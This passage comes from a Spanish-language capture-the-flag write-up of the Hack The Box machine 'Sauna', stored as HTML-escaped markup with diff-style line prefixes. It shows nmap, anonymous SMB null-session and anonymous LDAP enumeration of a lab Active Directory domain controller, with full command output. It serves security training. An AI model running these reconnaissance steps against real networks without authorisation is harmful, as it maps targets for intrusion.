-389/tcp   open  ldap          Microsoft Windows Active Directory LDAP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-445/tcp   open  microsoft-ds?
-464/tcp   open  kpasswd5?
-593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-636/tcp   open  tcpwrapped
-3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-3269/tcp  open  tcpwrapped
-5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|_http-server-header: Microsoft-HTTPAPI/2.0
-|_http-title: Not Found
-9389/tcp  open  mc-nmf        .NET Message Framing
-49667/tcp open  msrpc         Microsoft Windows RPC
-49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-49674/tcp open  msrpc         Microsoft Windows RPC
-49677/tcp open  msrpc         Microsoft Windows RPC
-49689/tcp open  msrpc         Microsoft Windows RPC
-49696/tcp open  msrpc         Microsoft Windows RPC
-Service Info: Host: SAUNA&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; OS: Windows&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows
-
-Host script results:
-| smb2-security-mode: 
-|   3.1.1: 
-|_    Message signing enabled and required
-|_clock-skew: 6h59m59s
-| smb2-time: 
-|   &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;: 2022-01-28T15:36:23
-|_  start_date: N/A
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;101.52 seconds
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Tenemos el puerto 445 abierto, así que trataremos de ingresar con una &lt;strong&gt;&lt;em&gt;Null Session&lt;/em&gt;&lt;/strong&gt; para ver que recursos podemos observar.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ smbclient &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; 10.10.10.175 &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt;
-Anonymous login successful
-
-        Sharename       Type      Comment
-        &lt;span class=&quot;nt&quot;&gt;---------&lt;/span&gt;       &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;      &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
-SMB1 disabled &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; no workgroup available
-❯ smbmap &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; 10.10.10.175 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'null'&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Authentication error on 10.10.10.175
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;No tenemos nada interesante, así que ahora vamos a echarle un ojo al puerto 80 y como siempre, utilizando la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whatweb&lt;/code&gt; para ver a lo que nos enfrentamos y posteriormente desde un navegador.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ whatweb http://10.10.10.175/
-http://10.10.10.175/ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;200 OK] Bootstrap, Country[RESERVED][ZZ], Email[example@email.com,info@example.com], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.175], Microsoft-IIS[10.0], Script, Title[Egotistical Bank :: Home]
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-sauna/sauna-web.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Del sitio web, en el recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;about.html&lt;/code&gt; vemos unos nombres de usuarios y podrían ser usuarios a nivel de sistema. Del resto, poca cosa podemos obtener del sitio web. Para validar si dichos usuaros se encuentran, vamos a enumerar un poco el servicio LDAP.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ldapsearch &lt;span class=&quot;nt&quot;&gt;-LLL&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; ldap://10.10.10.175 &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; base &lt;span class=&quot;s1&quot;&gt;'(objectclass=*)'&lt;/span&gt;
-dn:                                                             
-domainFunctionality: 7                                                                                                           
-forestFunctionality: 7                                          
-domainControllerFunctionality: 7                                
-rootDomainNamingContext: &lt;span class=&quot;nv&quot;&gt;DC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LOCAL
-ldapServiceName: EGOTISTICAL-BANK.LOCAL:sauna&lt;span class=&quot;nv&quot;&gt;$@&lt;/span&gt;EGOTISTICAL-BANK.LOCAL
-isGlobalCatalogReady: TRUE                                      
-supportedSASLMechanisms: GSSAPI                                 
-supportedSASLMechanisms: GSS-SPNEGO                             
-supportedSASLMechanisms: EXTERNAL        
-supportedSASLMechanisms: DIGEST-MD5             
-supportedLDAPVersion: 3                                         
-supportedLDAPVersion: 2                                         
-supportedLDAPPolicies: MaxPoolThreads    
-supportedLDAPPolicies: MaxPercentDirSyncRequests
-supportedLDAPPolicies: MaxDatagramRecv   
-supportedLDAPPolicies: MaxReceiveBuffer  
-supportedLDAPPolicies: InitRecvTimeout       
-supportedLDAPPolicies: MaxConnections    
-supportedLDAPPolicies: MaxConnIdleTime   
-supportedLDAPPolicies: MaxPageSize           
-supportedLDAPPolicies: MaxBatchReturnMessages 
-supportedLDAPPolicies: MaxQueryDuration       
-supportedLDAPPolicies: MaxDirSyncDuration     
-supportedLDAPPolicies: MaxTempTableSize       
-supportedLDAPPolicies: MaxResultSetSize       
-supportedLDAPPolicies: MinResultSets                                                                                             
-supportedLDAPPolicies: MaxResultSetsPerConn
-supportedLDAPPolicies: MaxNotificationPerConn                                                                                    
-supportedLDAPPolicies: MaxValRange      
-supportedLDAPPolicies: MaxValRangeTransitive                                                                                     
-supportedLDAPPolicies: ThreadMemoryLimit    
-supportedLDAPPolicies: SystemMemoryLimitPercent
-supportedControl: 1.2.840.113556.1.4.319
-supportedControl: 1.2.840.113556.1.4.801                                                                                         
-supportedControl: 1.2.840.113556.1.4.473    
-supportedControl: 1.2.840.113556.1.4.528                     
-supportedControl: 1.2.840.113556.1.4.417                                                                                         
-supportedControl: 1.2.840.113556.1.4.619                      
-supportedControl: 1.2.840.113556.1.4.841                      
-supportedControl: 1.2.840.113556.1.4.529
-supportedControl: 1.2.840.113556.1.4.805
-supportedControl: 1.2.840.113556.1.4.521                                                                                         
-supportedControl: 1.2.840.113556.1.4.970                
-supportedControl: 1.2.840.113556.1.4.1338
-supportedControl: 1.2.840.113556.1.4.474          
-supportedControl: 1.2.840.113556.1.4.1339
-supportedControl: 1.2.840.113556.1.4.1340                                                                                        
-supportedControl: 1.2.840.113556.1.4.1413
-supportedControl: 2.16.840.1.113730.3.4.9
-supportedControl: 2.16.840.1.113730.3.4.10              
-supportedControl: 1.2.840.113556.1.4.1504
-supportedControl: 1.2.840.113556.1.4.1852
-supportedControl: 1.2.840.113556.1.4.802
-supportedControl: 1.2.840.113556.1.4.1907
-supportedControl: 1.2.840.113556.1.4.1948
-supportedControl: 1.2.840.113556.1.4.1974
-supportedControl: 1.2.840.113556.1.4.1341
-supportedControl: 1.2.840.113556.1.4.2026
-supportedControl: 1.2.840.113556.1.4.2064
-supportedControl: 1.2.840.113556.1.4.2065
-supportedControl: 1.2.840.113556.1.4.2066
-supportedControl: 1.2.840.113556.1.4.2090
-supportedControl: 1.2.840.113556.1.4.2205
-supportedControl: 1.2.840.113556.1.4.2204
-supportedControl: 1.2.840.113556.1.4.2206
-supportedControl: 1.2.840.113556.1.4.2211
-supportedControl: 1.2.840.113556.1.4.2239
-supportedControl: 1.2.840.113556.1.4.2255
-supportedControl: 1.2.840.113556.1.4.2256
-supportedControl: 1.2.840.113556.1.4.2309
-supportedControl: 1.2.840.113556.1.4.2330
-supportedControl: 1.2.840.113556.1.4.2354
-supportedCapabilities: 1.2.840.113556.1.4.800
-supportedCapabilities: 1.2.840.113556.1.4.1670
-supportedCapabilities: 1.2.840.113556.1.4.1791
-supportedCapabilities: 1.2.840.113556.1.4.1935
-supportedCapabilities: 1.2.840.113556.1.4.2080
-supportedCapabilities: 1.2.840.113556.1.4.2237
-subschemaSubentry: &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Aggregate,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Schema,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Configuration,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;EGOTISTICAL-BANK
- ,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LOCAL
-serverName: &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;SAUNA,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Servers,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Default-First-Site-Name,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Sites,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Configu
- ration,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LOCAL
-schemaNamingContext: &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Schema,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Configuration,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LOCAL
-namingContexts: &lt;span class=&quot;nv&quot;&gt;DC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LOCAL
-namingContexts: &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Configuration,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LOCAL
-namingContexts: &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Schema,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Configuration,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LOCAL
-namingContexts: &lt;span class=&quot;nv&quot;&gt;DC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;DomainDnsZones,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LOCAL
-namingContexts: &lt;span class=&quot;nv&quot;&gt;DC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;ForestDnsZones,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LOCAL
-isSynchronized: TRUE
-highestCommittedUSN: 98377
-dsServiceName: &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;NTDS Settings,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;SAUNA,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Servers,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Default-First-Site-Name
- ,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Sites,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Configuration,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LOCAL
-dnsHostName: SAUNA.EGOTISTICAL-BANK.LOCAL
-defaultNamingContext: &lt;span class=&quot;nv&quot;&gt;DC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LOCAL
-currentTime: 20220128155018.0Z
-configurationNamingContext: &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Configuration,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LOCAL
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Algo que vemos aqui es el nombre de dominio (que tambien nos la da la captura de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt;) &lt;strong&gt;EGOTISTICAL-BANK&lt;/strong&gt;. Vamos a seguir enumerando un poco más aprovechando que el ldap está abierto.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ldapsearch &lt;span class=&quot;nt&quot;&gt;-LLL&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; ldap://10.10.10.175 &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;DC=EGOTISTICAL-BANK,DC=LOCAL&quot;&lt;/span&gt;
-dn: &lt;span class=&quot;nv&quot;&gt;DC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LOCAL                                                                                                 
-objectClass: top                                                
-objectClass: domain                                                                                                              
-objectClass: domainDNS                                          
-distinguishedName: &lt;span class=&quot;nv&quot;&gt;DC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LOCAL
-instanceType: 5                                                 
-whenCreated: 20200123054425.0Z                                                                                                   
-whenChanged: 20220128153248.0Z                                                                                                   
-subRefs: &lt;span class=&quot;nv&quot;&gt;DC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;ForestDnsZones,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LOCAL 
-subRefs: &lt;span class=&quot;nv&quot;&gt;DC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;DomainDnsZones,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LOCAL
-subRefs: &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Configuration,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LOCAL                                                                           
-uSNCreated: 4099      
-dSASignature:: AQAAACgAAAAAAAAAAAAAAAAAAAAAAAAAQL7gs8Yl7ESyuZ/4XESy7A&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;       
-uSNChanged: 98336                                               
-name: EGOTISTICAL-BANK                                                                                                           
-objectGUID:: 7AZOUMEioUOTwM9IB/gzYw&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;
-replUpToDateVector:: AgAAAAAAAAAGAAAAAAAAAEbG/1RIhXVKvwnC1AVq4o8WgAEAAAAAAJ6dB
- BgDAAAAq4zveNFJhUSywu2cZf6vrQzgAAAAAAAAKDj+FgMAAADc0VSB8WEuQrRECkAJ5oR1FXABAA
- AAAADUbg8XAwAAAP1ahZJG3l5BqlZuakAj9gwL0AAAAAAAANDwChUDAAAAm/DFn2wdfEWLFfovGj4
- TThRgAQAAAAAAENUAFwMAAABAvuCzxiXsRLK5n/hcRLLsCbAAAAAAAADUBFIUAwAAAA&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;
-creationTime: 132878575681449963                                                                                                 
-forceLogoff: &lt;span class=&quot;nt&quot;&gt;-9223372036854775808&lt;/span&gt;
-lockoutDuration: &lt;span class=&quot;nt&quot;&gt;-18000000000&lt;/span&gt;                                                                                                    
-lockOutObservationWindow: &lt;span class=&quot;nt&quot;&gt;-18000000000&lt;/span&gt;
-lockoutThreshold: 0                                                                                                              
-maxPwdAge: &lt;span class=&quot;nt&quot;&gt;-36288000000000&lt;/span&gt;
-minPwdAge: &lt;span class=&quot;nt&quot;&gt;-864000000000&lt;/span&gt;                                                                                                         
-minPwdLength: 7              
-modifiedCountAtLastProm: 0                                                                                                       
-nextRid: 1000       
-pwdProperties: 1                                                                                                                 
-pwdHistoryLength: 24
-objectSid:: AQQAAAAAAAUVAAAA+o7VsIowlbg+rLZG                                                                                     
-serverState: 1
-uASCompat: 1                                                    
-modifiedCount: 1                                                                                                                 
-auditingPolicy:: &lt;span class=&quot;nv&quot;&gt;AAE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;                                                                                                            
-nTMixedDomain: 0
-rIDManagerReference: &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;RID Manager&lt;span class=&quot;nv&quot;&gt;$,CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;System,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LOCAL
-fSMORoleOwner: &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;NTDS Settings,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;SAUNA,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Servers,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Default-First-Site-Name
- ,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Sites,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Configuration,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LOCAL
-systemFlags: &lt;span class=&quot;nt&quot;&gt;-1946157056&lt;/span&gt;
-wellKnownObjects: B:32:6227F0AF1FC2410D8E3BB10615BB5B0F:CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;NTDS Quotas,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;EGOT
- ISTICAL-BANK,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LOCAL
-wellKnownObjects: B:32:F4BE92A4C777485E878E9421D53087DB:CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Microsoft,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Progra
- m Data,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LOCAL
-wellKnownObjects: B:32:09460C08AE1E4A4EA0F64AEE7DAA1E5A:CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Program Data,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;EGO
- TISTICAL-BANK,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LOCAL
-wellKnownObjects: B:32:22B70C67D56E4EFB91E9300FCA3DC1AA:CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;ForeignSecurityPrin
- cipals,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LOCAL
-wellKnownObjects: B:32:18E2EA80684F11D2B9AA00C04F79F805:CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Deleted Objects,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
- EGOTISTICAL-BANK,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LOCAL
-wellKnownObjects: B:32:2FBAC1870ADE11D297C400C04FD8D5CD:CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Infrastructure,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;E
- GOTISTICAL-BANK,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LOCAL
-wellKnownObjects: B:32:AB8153B7768811D1ADED00C04FD8D5CD:CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LostAndFound,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;EGO
- TISTICAL-BANK,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LOCAL
-wellKnownObjects: B:32:AB1D30F3768811D1ADED00C04FD8D5CD:CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;System,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;EGOTISTIC
- AL-BANK,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LOCAL
-wellKnownObjects: B:32:A361B2FFFFD211D1AA4B00C04FD7D83A:OU&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Domain Controllers,
- &lt;span class=&quot;nv&quot;&gt;DC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LOCAL
-wellKnownObjects: B:32:AA312825768811D1ADED00C04FD8D5CD:CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Computers,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;EGOTIS
- TICAL-BANK,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LOCAL
-wellKnownObjects: B:32:A9D1CA15768811D1ADED00C04FD8D5CD:CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Users,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;EGOTISTICA
- L-BANK,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LOCAL
-objectCategory: &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Domain-DNS,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Schema,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Configuration,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,D
- &lt;span class=&quot;nv&quot;&gt;C&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LOCAL
-isCriticalSystemObject: TRUE
-gPLink: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;LDAP://CN&lt;span class=&quot;o&quot;&gt;={&lt;/span&gt;31B2F340-016D-11D2-945F-00C04FB984F9&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Policies,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Syste
- m,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LOCAL&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;0]
-dSCorePropagationData: 16010101000000.0Z
-otherWellKnownObjects: B:32:683A24E2E8164BD3AF86AC3C2CF3F981:CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Keys,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;EGOTIS
- TICAL-BANK,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LOCAL
-otherWellKnownObjects: B:32:1EB93889E40C45DF9F0C64D23BBB6237:CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Managed Servic
- e Accounts,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LOCAL
-masteredBy: &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;NTDS Settings,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;SAUNA,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Servers,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Default-First-Site-Name,CN
- &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Sites,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Configuration,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LOCAL
-ms-DS-MachineAccountQuota: 10                                                                                              &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2/81]
-msDS-Behavior-Version: 7                                                                                                         
-msDS-PerUserTrustQuota: 1                                                                                                        
-msDS-AllUsersTrustQuota: 1000
-msDS-PerUserTrustTombstonesQuota: 10
-msDs-masteredBy: &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;NTDS Settings,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;SAUNA,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Servers,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Default-First-Site-Na
- me,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Sites,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Configuration,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LOCAL
-msDS-IsDomainFor: &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;NTDS Settings,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;SAUNA,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Servers,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Default-First-Site-N
- ame,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Sites,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Configuration,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LOCAL
-msDS-NcType: 0
-msDS-ExpirePasswordsOnSmartCardOnlyAccounts: TRUE
-dc: EGOTISTICAL-BANK
-
-dn: &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Users,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LOCAL
-
-dn: &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Computers,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LOCAL
-
